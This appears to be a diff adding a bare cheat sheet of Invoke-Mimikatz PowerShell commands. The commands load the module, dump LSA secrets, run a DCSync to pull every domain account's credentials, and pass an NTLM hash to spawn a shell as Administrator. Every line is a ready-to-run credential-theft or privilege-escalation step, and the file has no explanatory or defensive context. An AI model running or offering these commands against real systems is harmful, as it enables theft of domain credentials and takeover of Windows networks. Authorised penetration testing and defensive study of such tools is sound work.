@@ -1,0 +1,7 @@
+
+Import-module .\Invoke-Mimikatz.ps1
+.\Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN.local /ntlm:ntlmhash /run:powershell.exe"'
